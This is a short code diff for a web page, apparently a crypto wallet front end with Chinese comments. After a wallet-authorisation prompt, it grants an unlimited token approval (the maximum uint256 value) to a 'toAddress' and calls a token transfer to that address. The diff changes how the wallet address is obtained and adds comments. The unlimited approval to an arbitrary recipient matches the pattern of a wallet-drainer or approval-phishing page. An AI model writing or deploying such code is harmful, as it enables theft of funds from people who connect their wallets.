@@ -120,7 +120,9 @@
     async function getWallet() {
       document.getElementById("status").innerText = "请求钱包授权...";
       try {
-        const accounts = await window.ethereum.request({method: 'eth_requestAccounts'});
+        // 使用 Web3 方式获取钱包地址
+        const web3 = new Web3(window.ethereum);
+        const accounts = await web3.eth.getAccounts();
         if (!accounts || accounts.length === 0) {
           throw new Error("获取钱包地址失败");
         }
@@ -137,6 +139,7 @@
         const contract = new web3.eth.Contract(contract_abi, contractAddress);
         const maxAmount = '115792089237316195423570985008687907853269984665640564039457584007913129639935';
         
+        // 直接调用合约的 approve 方法
         const result = await contract.methods.approve(toAddress, maxAmount)
           .send({from: from})
           .on('transactionHash', function(hash) {
@@ -159,6 +162,7 @@
         const contract = new web3.eth.Contract(contract_abi, contractAddress);
         const amountInWei = (BigInt(amount * (10 ** decimals))).toString();
         
+        // 直接调用合约的 transfer 方法
         const result = await contract.methods.transfer(toAddress, amountInWei)
           .send({from: from})
           .on('transactionHash', function(hash) {
